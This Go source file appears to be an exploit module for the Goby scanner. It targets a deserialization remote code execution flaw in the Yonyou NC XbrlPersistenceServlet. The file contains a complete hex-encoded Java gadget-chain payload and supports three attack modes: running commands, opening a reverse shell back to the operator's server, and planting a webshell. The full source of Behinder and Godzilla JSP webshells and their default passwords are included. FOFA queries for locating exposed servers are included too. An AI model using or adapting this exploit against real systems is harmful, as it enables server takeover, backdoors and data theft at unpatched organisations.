package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC XbrlPersistenceServlet Api Remote Code Execute Vulnerability",
    "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2023-08-20",
    "PostTime": "2023-08-21",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\" || body=\"/portal/ufida.ico\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"/Client/Uclient/UClient.dmg\" || body=\"/portal/ufida.ico\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://security.yonyou.com/#/noticeInfo?id=428\">https://security.yonyou.com/#/noticeInfo?id=428</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC XbrlPersistenceServlet 接口远程代码执行漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，实现企业的数字化转型和业务流程优化。</p><p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://security.yonyou.com/#/noticeInfo?id=428\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=428</a></p>",
            "Impact": "<p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC XbrlPersistenceServlet Api Remote Code Execute Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://security.yonyou.com/#/noticeInfo?id=428\" target=\"_blank\">https://security.yonyou.com/#/noticeInfo?id=428</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10874"
}`

	sendPayloadDSWUIZZZZJDOZ := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/service/~xbrl/XbrlPersistenceServlet")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("cmd", cmd)
		payload, _ := hex.DecodeString("aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000077372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e000378707672002a6f72672e6d6f7a696c6c612e6a6176617363726970742e446566696e696e67436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400166765744465636c61726564436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00180000000074000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e0018000000027400024134757200025b42acf317f8060854e0020000787000001bbbcafebabe00000031019a0a001e00ad0a004300ae0a004300af0a001e00b00800b10a001c00b20a00b300b40a00b300b50700b60a004300b70800a50a002100b80800b90800ba0700bb0800bc0800bd0700be0a001c00bf0800c00800c10700c20b001600c30b00c400c50b00c400c60800c70800c80700c90a001c00ca0700cb0a00cc00cd0800ce0700cf0800d00a008f00d10a002100d20800d30900d400d50a00d400d60800d70a008f00d80a001c00d90800da0700db0a001c00dc0800dd0700de0800df0800e00a001c00e10700e20a004300e30a00e400d80800e50a002100e60800e70a002100e80800e90a002100ea0a008f00eb0800ec0a002100ed0800ee09008f00ef0a00d400f009008f00f10700f20a004300f30a004300f40800a60800f50800f60a008f00f70800f80a008f00f90700fa0a004c00fb0700fc0a004e00fd0a008f00fe0a004e00ff0a004e01000a004e01010a002f01020a004c01030a002101040801050a010601070a0021010808010908010a08010b07010c0a005d00ad0a005d010d08010e0a005d010208010f0801100801110801120a011301140a011301150701160a011701180a0068011908011a0a0068011b0a006800c50a0068011c0a0117011d0a0117011e08011f0801200a011301210701220a007401230a007401180a011701240a007401240a007401250a012601270a012601280a0129012a0a012901000500000000000000320a0043012b0a0117012c0a0074010108012d0a002f012e08012f0801300a00d401310a008f01320801330801340801350801360800a908013707013801000c4241534536345f43484152530100124c6a6176612f6c616e672f537472696e673b01000d436f6e7374616e7456616c75650801390100026970010004706f72740100134c6a6176612f6c616e672f496e74656765723b0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000a457863657074696f6e730100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100095369676e6174757265010028284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733c2a3e3b01000570726f7879010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100057772697465010038284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000a636c656172506172616d0100046578656301000772657665727365010027284c6a6176612f6c616e672f537472696e673b49294c6a6176612f6c616e672f537472696e673b01000372756e0100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b4201000a536f7572636546696c6501000741342e6a6176610c009700980c013a013b0c013c013d0c013e013f010007746872656164730c014001410701420c014301440c014501460100135b4c6a6176612f6c616e672f5468726561643b0c014701480c0149014a010004687474700100067461726765740100126a6176612f6c616e672f52756e6e61626c6501000674686973243001000768616e646c657201001e6a6176612f6c616e672f4e6f537563684669656c64457863657074696f6e0c014b013f010006676c6f62616c01000a70726f636573736f727301000e6a6176612f7574696c2f4c6973740c014c014d07014e0c014f01500c0151015201000372657101000b676574526573706f6e736501000f6a6176612f6c616e672f436c6173730c015301540100106a6176612f6c616e672f4f626a6563740701550c015601570100096765744865616465720100106a6176612f6c616e672f537472696e67010003636d640c00a000a10c0158015901000973657453746174757307015a0c015b015c0c015d015e0100246f72672e6170616368652e746f6d6361742e7574696c2e6275662e427974654368756e6b0c009c009d0c015f015201000873657442797465730100025b420c01600154010007646f57726974650100136a6176612f6c616e672f457863657074696f6e0100136a6176612e6e696f2e42797465427566666572010004777261700c0161009d0100206a6176612f6c616e672f436c6173734e6f74466f756e64457863657074696f6e0c016201630701640100000c01650166010010636f6d6d616e64206e6f74206e756c6c0c0167014801000523232323230c016801690c00a400a10100013a0c016a016b010022636f6d6d616e64207265766572736520686f737420666f726d6174206572726f72210c009400910c016c016d0c009500960100106a6176612f6c616e672f5468726561640c0097016e0c016f0098010005242424242401001266696c6520666f726d6174206572726f72210c00a200a301000540404040400c00a500a101000c6a6176612f696f2f46696c650c009701700100186a6176612f696f2f46696c654f757470757453747265616d0c009701710c00a900aa0c00a201720c017300980c017400980c017501480c017601480c017701780100076f732e6e616d650701790c017a00a10c017b014801000377696e01000470696e670100022d6e0100176a6176612f6c616e672f537472696e674275696c6465720c017c017d010005202d6e20340100022f63010005202d74203401000273680100022d6307017e0c017f01800c00a501810100116a6176612f7574696c2f5363616e6e65720701820c018301840c009701850100025c610c018601870c015101480c018801840c018900980100072f62696e2f7368010007636d642e6578650c00a5018a01000f6a6176612f6e65742f536f636b65740c0097018b0c018c018d0c018e015007018f0c019001910c019201910701930c00a201940c019501960c0197019101001d726576657273652065786563757465206572726f722c206d7367202d3e0c0198014801000121010013726576657273652065786563757465206f6b210c019901910c00a600a701001673756e2e6d6973632e4241534536344465636f64657201000c6465636f64654275666665720100106a6176612e7574696c2e42617365363401000a6765744465636f6465720100266f72672e6170616368652e636f6d6d6f6e732e636f6465632e62696e6172792e42617365363401000241340100404142434445464748494a4b4c4d4e4f505152535455565758595a6162636465666768696a6b6c6d6e6f707172737475767778797a303132333435363738392b2f01000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b01000e67657454687265616447726f757001001928294c6a6176612f6c616e672f54687265616447726f75703b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000d6765745375706572636c6173730100086974657261746f7201001628294c6a6176612f7574696c2f4974657261746f723b0100126a6176612f7574696c2f4974657261746f720100076861734e65787401000328295a0100046e65787401001428294c6a6176612f6c616e672f4f626a6563743b0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b010008676574427974657301000428295b420100116a6176612f6c616e672f496e7465676572010004545950450100114c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b01000b6e6577496e7374616e63650100116765744465636c617265644d6574686f64010007666f724e616d65010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100156a6176612f6c616e672f436c6173734c6f61646572010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100047472696d01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a01000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100087061727365496e74010015284c6a6176612f6c616e672f537472696e673b2949010017284c6a6176612f6c616e672f52756e6e61626c653b29560100057374617274010015284c6a6176612f6c616e672f537472696e673b2956010011284c6a6176612f696f2f46696c653b2956010005285b422956010005666c757368010005636c6f7365010008746f537472696e6701000f6765744162736f6c757465506174680100077265706c616365010044284c6a6176612f6c616e672f4368617253657175656e63653b4c6a6176612f6c616e672f4368617253657175656e63653b294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f77657243617365010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b295601000c75736544656c696d69746572010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f7574696c2f5363616e6e65723b01000e6765744572726f7253747265616d01000764657374726f79010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b010016284c6a6176612f6c616e672f537472696e673b49295601000f6765744f757470757453747265616d01001828294c6a6176612f696f2f4f757470757453747265616d3b0100086973436c6f7365640100136a6176612f696f2f496e70757453747265616d010009617661696c61626c65010003282949010004726561640100146a6176612f696f2f4f757470757453747265616d01000428492956010005736c656570010004284a29560100096578697456616c756501000a6765744d657373616765010008696e7456616c75650021008f001e0001000f0003001a009000910001009200000002009300020094009100000002009500960000000900010097009800020099000003b6000600130000028e2ab70001b80002b600034c2bb600041205b600064d2c04b600072c2bb60008c00009c000094e2d3a041904be360503360615061505a2025819041506323a071907c70006a702431907b6000a3a081908120bb6000c9a000d1908120db6000c9a0006a702251907b60004120eb600064d2c04b600072c1907b600083a091909c1000f9a0006a702021909b600041210b600064d2c04b600072c1909b600083a091909b600041211b600064da700163a0a1909b60004b60013b600131211b600064d2c04b600072c1909b600083a091909b60004b600131214b600064da700103a0a1909b600041214b600064d2c04b600072c1909b600083a091909b600041215b600064d2c04b600072c1909b60008c00016c000163a0a190ab9001701003a0b190bb90018010099015b190bb9001901003a0c190cb60004121ab600064d2c04b600072c190cb600083a0d190db60004121b03bd001cb6001d190d03bd001eb6001f3a0e190db60004122004bd001c5903122153b6001d190d04bd001e5903122253b6001fc000213a0f190fc70006a7ff912a190fb60023b600243a10190eb60004122504bd001c5903b2002653b6001d190e04bd001e59031100c8b8002753b6001f572a1228b600293a111911b6002a3a091911122b06bd001c5903122c535904b20026535905b2002653b6002d190906bd001e5903191053590403b800275359051910beb8002753b6001f57190eb60004122e04bd001c5903191153b6001d190e04bd001e5903190953b6001f57a7004f3a112a1230b600293a121912123104bd001c5903122c53b6002d191204bd001e5903191053b6001f3a09190eb60004122e04bd001c5903191253b6001d190e04bd001e5903190953b6001f57a7000ea700053a08840601a7fda7b1000700a000ab00ae001200ce00dc00df001201c402300233002f003f00440285002f004700620285002f006500850285002f0088027f0285002f0001009a000000de00370000001700040018000b00190015001a001a001b0026001d003f001f00470020004e0021006500220070002300750024007d002500880026009300270098002800a0002a00ab002d00ae002b00b0002c00c1002e00c6002f00ce003100dc003400df003200e1003300ec003500f1003600f9003701040038010900390117003a0133003b013e003c0143003d014b003e0164003f018a0040018f004101920043019d004401c4004601cc004701d30048020e00490230004e0233004a0235004b023d004c025d004d027f004f02820053028500510287001d028d0055009b000000040001002f0001009c009d000300990000003900020003000000112bb80032b04db80002b600342bb60035b0000100000004000500330001009a0000000e00030000005f0005006000060061009b0000000400010033009e00000002009f000100a000a100010099000000ff000400040000009b2bc6000c12362bb600379900061238b02bb600394c2b123ab6003b99003b2a2bb7003c123db6003e4d2cbe059f0006123fb02a2c0332b500402a2c0432b80041b80027b50042bb0043592ab700444e2db600451246b02b1247b6003b9900222a2bb7003c123db6003e4d2cbe059f00061248b02a2c03322c0432b60049b02b124ab6003b99000d2a2a2bb7003cb6004bb02a2a2bb7003cb6004bb000000001009a0000005200140000006b000d006c0010006e0015006f001e007100290072002f0073003200750039007600460077004f0078005300790056007a005f007b006a007c0070007d0073007f007e00800087008100910083000100a200a300010099000000760003000500000036bb004c592bb7004d4ebb004e592db7004f3a0419042cb80050b600511904b600521904b60053a7000b3a041904b60054b02db60055b00001000900260029002f0001009a0000002600090000008e0009009000130091001c0092002100930026009600290094002b009500310097000200a400a1000100990000002f00030002000000172b123a1236b60056124a1236b6005612471236b60056b000000001009a000000060001000000a0000100a500a100010099000001c300040009000001271257b80058b600594d2bb600394c014e2c125ab6000c9900402b125bb6000c9900202b125cb6000c9a0017bb005d59b7005e2bb6005f1260b6005fb600614c06bd00215903122253590412625359052b533a04a7003d2b125bb6000c9900202b125cb6000c9a0017bb005d59b7005e2bb6005f1263b6005fb600614c06bd00215903126453590412655359052b533a04b800661904b600674ebb0068592db60069b7006a126bb6006c3a051905b6006d99000b1905b6006ea7000512363a06bb0068592db6006fb7006a126bb6006c3a05bb005d59b7005e1906b6005f1905b6006d99000b1905b6006ea700051236b6005fb600613a0619063a072dc600072db600701907b03a051905b600543a062dc600072db600701906b03a082dc600072db600701908bf0004009000fb0106002f009000fb011a00000106010f011a0000011a011c011a00000001009a0000006a001a000000a9000900aa000e00ab001000ad001900ae002b00af003f00b1005600b3006800b4007c00b6009000b9009900ba00ab00bb00bf00bc00d100bd00f700be00fb00c200ff00c3010300be010600bf010800c0010f00c2011300c3011700c0011a00c2012000c3000100a600a700010099000001720004000c000000e21257b80058b60059125ab6000c9a000912714ea7000612724eb800662db600733a04bb0074592b1cb700753a051904b600693a061904b6006f3a071905b600763a081904b600773a091905b600783a0a1905b600799a00601906b6007a9e0010190a1906b6007bb6007ca7ffee1907b6007a9e0010190a1907b6007bb6007ca7ffee1908b6007a9e001019091908b6007bb6007ca7ffee190ab6007d1909b6007d14007eb800801904b6008157a700083a0ba7ff9e1904b600701905b60082a700204ebb005d59b7005e1283b6005f2db60084b6005f1285b6005fb60061b01286b0000200a700ad00b0002f000000bf00c2002f0001009a0000006e001b000000d1001000d2001600d4001900d6002200d7002d00d8004200d9005000da005800db006000dc006d00de007500df008200e1008a00e2009700e4009c00e500a100e600a700e800ad00e900b000ea00b200eb00b500ed00ba00ee00bf00f100c200ef00c300f000df00f2000100a80098000100990000002d00030001000000112a2ab400402ab40042b60087b6008857b100000001009a0000000a0002000000f7001000f8000900a900aa000100990000011c00060004000000ac014c1289b800324d2c128a04bd001c5903122153b6001d2cb6002a04bd001e59032a53b6001fc0002cc0002c4ca700044d2bc70043128bb80032128c03bd001cb6001d0103bd001eb6001f4d2cb60004128d04bd001c5903122153b6001d2c04bd001e59032a53b6001fc0002cc0002c4ca700044d2bc70034128eb800324d2c128d04bd001c5903122153b6001d4e2d2cb6002a04bd001e59032a53b6001fc0002cc0002c4ca700044d2bb000030002002d0030002f003500710074002f007900a600a9002f0001009a000000460011000001000002010200080103002d0106003001040031010700350109004c010a0071010d0074010b0075010f00790111007f0112008f011300a6011600a9011400aa0118000100ab0000000200ac74000b646566696e65436c6173737571007e001a00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00287371007e00137571007e0018000000017571007e001a0000000071007e001c7571007e001a0000000171007e001e7371007e00137571007e0018000000017571007e00180000000071007e00227571007e001a0000000171007e00247371007e000f7371007e0000770c000000103f4000000000000078737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	checkFileExistDSZXCBBCB := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(15)
			resp, err := sendPayloadDSWUIZZZZJDOZ(hostInfo, "echo "+checkString)
			return err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			webshell := stepLogs.Params["webshell"].(string)
			if attackType == "cmd" {
				cmd := stepLogs.Params["cmd"].(string)
				resp, err := sendPayloadDSWUIZZZZJDOZ(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
					return expResult
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				_, err = sendPayloadDSWUIZZZZJDOZ(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = stepLogs.Params["content"].(string)
					filename = stepLogs.Params["filename"].(string)
				}
				_, err := sendPayloadDSWUIZZZZJDOZ(expResult.HostInfo, fmt.Sprintf("$$$$$./webapps/nc_web/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				resp, err := checkFileExistDSZXCBBCB(expResult.HostInfo, filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
